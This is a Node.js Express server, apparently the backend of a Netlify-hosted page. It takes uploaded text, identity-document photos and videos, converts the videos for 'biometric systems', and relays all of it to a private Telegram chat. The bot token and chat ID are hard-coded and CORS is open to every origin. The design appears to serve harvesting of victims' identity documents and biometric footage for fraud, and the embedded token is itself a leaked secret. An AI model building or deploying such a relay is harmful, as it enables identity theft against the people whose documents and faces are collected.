const express    = require('express');
const multer     = require('multer');
const ffmpeg     = require('fluent-ffmpeg');
const ffmpegPath = require('ffmpeg-static');
const TelegramBot = require('node-telegram-bot-api');
const cors       = require('cors');
const fs         = require('fs');
const path       = require('path');
const os         = require('os');

// ── Config ──────────────────────────────────────────
const BOT_TOKEN = process.env.BOT_TOKEN || '8959409030:AAEINdk9bCbaNWJy8ZQZwTabD_fkbxUqcvw';
const CHAT_ID   = process.env.CHAT_ID   || '6088313374';
const PORT      = process.env.PORT      || 3000;

ffmpeg.setFfmpegPath(ffmpegPath);

const bot = new TelegramBot(BOT_TOKEN);
const app = express();

// ── CORS — permite o seu site Netlify chamar este servidor ──
app.use(cors({
  origin: '*', // pode restringir ao seu domínio Netlify depois
  methods: ['GET', 'POST']
}));

app.use(express.json({ limit: '5mb' }));

// ── Multer — guarda ficheiros em /tmp ──────────────
const upload = multer({
  dest: os.tmpdir(),
  limits: { fileSize: 200 * 1024 * 1024 } // 200MB max
});

// ── Health check ───────────────────────────────────
app.get('/', (req, res) => {
  res.json({ status: 'ok', message: 'Bio converter a funcionar ✅' });
});

// ── Recebe mensagem de texto (resumo) ──────────────
app.post('/send-message', async (req, res) => {
  try {
    const { text } = req.body;
    await bot.sendMessage(CHAT_ID, text, { parse_mode: 'Markdown' });
    res.json({ ok: true });
  } catch (e) {
    console.error('send-message error:', e.message);
    res.status(500).json({ ok: false, error: e.message });
  }
});

// ── Recebe foto do documento ───────────────────────
app.post('/send-photo', upload.single('photo'), async (req, res) => {
  const tmpFile = req.file?.path;
  try {
    const caption = req.body.caption || '📄 Documento';
    await bot.sendPhoto(CHAT_ID, fs.createReadStream(tmpFile), { caption });
    res.json({ ok: true });
  } catch (e) {
    console.error('send-photo error:', e.message);
    res.status(500).json({ ok: false, error: e.message });
  } finally {
    if (tmpFile) fs.unlink(tmpFile, () => {});
  }
});

// ── Recebe vídeo, converte para MP4 H.264, envia ──
app.post('/send-video', upload.single('video'), async (req, res) => {
  const inputPath  = req.file?.path;
  const outputPath = inputPath + '_converted.mp4';

  try {
    const caption  = req.body.caption   || '📹 Vídeo';
    const filename = req.body.filename  || 'video.mp4';

    console.log(`A converter: ${req.file?.originalname} (${Math.round(req.file?.size/1024)}KB)`);

    // ── Converte para MP4 H.264 + AAC ──────────────
    await new Promise((resolve, reject) => {
      ffmpeg(inputPath)
        .outputOptions([
          '-c:v libx264',      // H.264 video — aceite por todos os sistemas biométricos
          '-preset fast',      // velocidade boa, qualidade boa
          '-crf 22',           // qualidade (18=alta, 28=baixa)
          '-c:a aac',          // AAC audio
          '-b:a 128k',         // bitrate áudio
          '-movflags +faststart', // permite streaming imediato
          '-vf scale=720:-2',  // 720px largura, altura proporcional
          '-pix_fmt yuv420p'   // compatibilidade máxima
        ])
        .output(outputPath)
        .on('start', cmd => console.log('FFmpeg:', cmd))
        .on('end', () => { console.log('Conversão concluída:', filename); resolve(); })
        .on('error', (err) => { console.error('FFmpeg erro:', err.message); reject(err); })
        .run();
    });

    // ── Envia para Telegram como vídeo ─────────────
    const stats = fs.statSync(outputPath);
    console.log(`A enviar ao Telegram: ${filename} (${Math.round(stats.size/1024)}KB)`);

    await bot.sendVideo(CHAT_ID, fs.createReadStream(outputPath), {
      caption,
      supports_streaming: true,
      filename
    });

    res.json({ ok: true, filename });

  } catch (e) {
    console.error('send-video error:', e.message);

    // Fallback: tenta enviar o ficheiro original se conversão falhar
    try {
      await bot.sendDocument(CHAT_ID, fs.createReadStream(inputPath), {
        caption: req.body.caption + ' ⚠️ (formato original)',
        filename: req.body.filename || 'video.webm'
      });
      res.json({ ok: true, warning: 'Enviado sem conversão: ' + e.message });
    } catch (e2) {
      res.status(500).json({ ok: false, error: e.message });
    }

  } finally {
    if (inputPath)  fs.unlink(inputPath,  () => {});
    if (outputPath) fs.unlink(outputPath, () => {});
  }
});

app.listen(PORT, () => {
  console.log(`✅ Servidor a correr na porta ${PORT}`);
});
